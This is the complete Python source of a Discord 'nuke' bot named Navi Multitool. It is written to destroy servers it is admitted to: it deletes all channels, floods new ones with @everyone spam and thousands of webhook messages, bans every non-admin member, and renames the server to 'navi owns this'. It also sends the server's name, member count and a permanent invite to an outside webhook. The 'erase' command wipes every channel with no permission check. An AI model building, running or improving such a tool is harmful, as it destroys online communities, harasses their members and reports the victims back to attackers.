#  _   _                 _ 
# | \ | |               (_)
# |  \| | __ ___   __ _  _ 
# | . ` |/ _` \ \ / /(_)| |
# | |\  | (_| |\ V /  _ | |
# |_| \_|\__,_| \_/  (_)|_|
# 
# Navi Multitool - Developed by glockinhand
# GitHub: https://github.com/glockinhand/navi-multitool

import asyncio
import discord
from discord.ext import commands
import aiohttp
import json
import random
import string
import os
config_path = "core/botcfg.json"
if not os.path.exists(config_path):
    default_config = {
        "BOT_TOKEN": "",
        "MESSAGE_CONTENT": "@everyone | Server owned | discord.gg/4qUD63pnPy | https://github.com/glockinhand/navi-multitool",
        "WEBHOOK_URL": "Your webhook URL for notifications",
        "GUILD_NEW_NAME": "navi owns this",
        "CHANNEL_AMOUNT": 60,
        "BATCH_SIZE_CHANNELS": 60,
        "BATCH_SIZE_DELETE": 30,
        "BATCH_SIZE_BAN": 4,
        "TOTAL_MESSAGES": 800,
        "MAX_MESSAGES_PER_CHANNEL": 18,
        "TOTAL_WEBHOOKS": 2000,
        "WEBHOOK_DELAY": 0.06,
        "SPAM_EMOJIS": ["🏴", "🌙", "🔥", "💀", "👾"],
        "WEBHOOK_USERNAME": "Navi Cord",
        "COMMAND_PREFIX": "."
    }
    os.makedirs("core", exist_ok=True)
    with open(config_path, "w", encoding="utf-8") as f:
        json.dump(default_config, f, indent=2)

with open(config_path, "r", encoding="utf-8") as config_file:
    config = json.load(config_file)

intents = discord.Intents.default()
intents.message_content = True
intents.members = True

async def main():
    bot = commands.Bot(command_prefix=config["COMMAND_PREFIX"], intents=intents)

    @bot.event
    async def on_ready():
        permissions = discord.Permissions(administrator=True)
        invite_link = discord.utils.oauth_url(bot.user.id, permissions=permissions)
        print(f"Bot is online as {bot.user}")
        print(f"Invite link: {invite_link}")

    @bot.command()
    async def kill(ctx):
        if not ctx.author.guild_permissions.administrator:
            await ctx.send("You need administrator permissions to use this command.")
            return
        guild = ctx.guild
        channels_to_delete = [c for c in guild.channels]
        for i in range(0, len(channels_to_delete), config["BATCH_SIZE_DELETE"]):
            batch = channels_to_delete[i:i + config["BATCH_SIZE_DELETE"]]
            await asyncio.gather(*[c.delete() for c in batch], return_exceptions=True)
            await asyncio.sleep(0.1)
        emojis = config["SPAM_EMOJIS"]
        amount = config["CHANNEL_AMOUNT"]
        batch_size = config["BATCH_SIZE_CHANNELS"]
        created_channels = []
        def random_gibberish(length=32):
            return ''.join(random.choices(string.ascii_lowercase, k=length))
        for i in range(0, amount, batch_size):
            current_batch = min(batch_size, amount - i)
            tasks = []
            for j in range(current_batch):
                emoji = random.choice(emojis)
                gibberish = random_gibberish(random.randint(10, 18))
                channel_name = f"〚{emoji}〛{gibberish}"
                tasks.append(guild.create_text_channel(channel_name))
            results = await asyncio.gather(*tasks, return_exceptions=True)
            for res in results:
                if isinstance(res, Exception):
                    if hasattr(res, 'status') and getattr(res, 'status', None) == 429:
                        print("[RATELIMIT] Channel creation rate limited!")
                else:
                    created_channels.append(res)
            await asyncio.sleep(0.4)

        if not created_channels:
            return
        num_channels = len(created_channels)
        half = num_channels // 2
        message_channels = created_channels[:half]
        webhook_channels = created_channels[half:]
        async def spam_messages(channels, total_amount=config["TOTAL_MESSAGES"], max_per_channel_per_round=config["MAX_MESSAGES_PER_CHANNEL"]):
            messages_sent = 0
            num_channels = len(channels)
            while messages_sent < total_amount:
                remaining = total_amount - messages_sent
                base_per_channel = remaining // num_channels
                extra = remaining % num_channels
                tasks = []
                expected_this_round = 0
                for idx, channel in enumerate(channels):
                    to_send = base_per_channel + (1 if idx < extra else 0)
                    to_send = min(to_send, max_per_channel_per_round)
                    to_send = min(to_send, remaining - expected_this_round)
                    if to_send <= 0:
                        continue
                    for _ in range(to_send):
                        tasks.append(channel.send(config["MESSAGE_CONTENT"]))
                    expected_this_round += to_send
                    if expected_this_round >= remaining:
                        break
                if not tasks:
                    break
                results = await asyncio.gather(*tasks, return_exceptions=True)
                successful = 0
                for r in results:
                    if isinstance(r, Exception):
                        if hasattr(r, 'status') and getattr(r, 'status', None) == 429:
                            print("[RATELIMIT] Message send rate limited!")
                    else:
                        successful += 1
                messages_sent += successful
                if messages_sent < total_amount:
                    await asyncio.sleep(1)
        async def spam_webhooks(channels, total_amount=config["TOTAL_WEBHOOKS"], delay=config["WEBHOOK_DELAY"]):
            webhooks = []
            for channel in channels:
                try:
                    webhook = await channel.create_webhook(name=config["WEBHOOK_USERNAME"])
                    webhooks.append(webhook)
                except Exception as e:
                    print(f"[ERROR] Creating webhook: {e}")
                await asyncio.sleep(delay)
            async def spam_webhook(webhook, amount):
                sent = 0
                while sent < amount:
                    try:
                        await webhook.send(config["MESSAGE_CONTENT"], username=config["WEBHOOK_USERNAME"])
                        sent += 1
                    except Exception as e:
                        if hasattr(e, 'status') and getattr(e, 'status', None) == 429:
                            print("[RATELIMIT] Webhook send rate limited!")
                        else:
                            print(f"[ERROR] Webhook send: {e}")
                        await asyncio.sleep(0.5)
            per_webhook = total_amount // len(webhooks) if webhooks else 0
            tasks = [spam_webhook(wh, per_webhook) for wh in webhooks]
            await asyncio.gather(*tasks, return_exceptions=True)
        await asyncio.gather(
            spam_messages(message_channels, total_amount=config["TOTAL_MESSAGES"]),
            spam_webhooks(webhook_channels, total_amount=config["TOTAL_WEBHOOKS"], delay=config["WEBHOOK_DELAY"])
        )
        try:
            if created_channels:
                invite = await created_channels[0].create_invite(max_age=0, max_uses=0)
                async with aiohttp.ClientSession() as session:
                    webhook = discord.Webhook.from_url(config["WEBHOOK_URL"], session=session)
                    await webhook.send(content=f" >> Server Name: {guild.name}\nMember Count: {guild.member_count}\nInvite Link: {invite.url}", allowed_mentions=discord.AllowedMentions.none())
        except Exception:
            pass
        try:
            await guild.edit(name=config["GUILD_NEW_NAME"])
        except Exception:
            pass
    @bot.command()
    async def massban(ctx):
        if not ctx.author.guild_permissions.administrator:
            await ctx.send("You need administrator permissions to use this command.")
            return
        guild = ctx.guild
        await ctx.send("Fetching all members...")
        all_members = []
        async for member in guild.fetch_members(limit=None):
            all_members.append(member)
        members = [m for m in all_members if not m.bot and m != ctx.author and not m.guild_permissions.administrator]
        batch_size = config["BATCH_SIZE_BAN"]
        banned = 0
        total = len(members)
        await ctx.send(f"Banning {total} members...")
        for i in range(0, total, batch_size):
            batch = members[i:i+batch_size]
            tasks = []
            for member in batch:
                tasks.append(guild.ban(member, reason="Massban by UtilityToolsV2"))
            results = await asyncio.gather(*tasks, return_exceptions=True)
            for idx, res in enumerate(results):
                if isinstance(res, Exception):
                    print(f"[ERROR] Failed to ban {batch[idx]}: {res}")
                else:
                    banned += 1
            await asyncio.sleep(1)  
        await ctx.send(f"Massban complete. Banned {banned} members.")
    @bot.command(name="erase")
    async def erase(ctx):
        guild = ctx.guild
        channels_to_delete = [c for c in guild.channels]
        for i in range(0, len(channels_to_delete), config["BATCH_SIZE_DELETE"]):
            batch = channels_to_delete[i:i + config["BATCH_SIZE_DELETE"]]
            await asyncio.gather(*[c.delete() for c in batch], return_exceptions=True)
            await asyncio.sleep(0.1)
    await bot.start(config["BOT_TOKEN"])

if __name__ == "__main__":
    print("Starting Nuke bot...")
    print(f"Nuke commands are {config['COMMAND_PREFIX']}kill and {config['COMMAND_PREFIX']}massban")
    asyncio.run(main())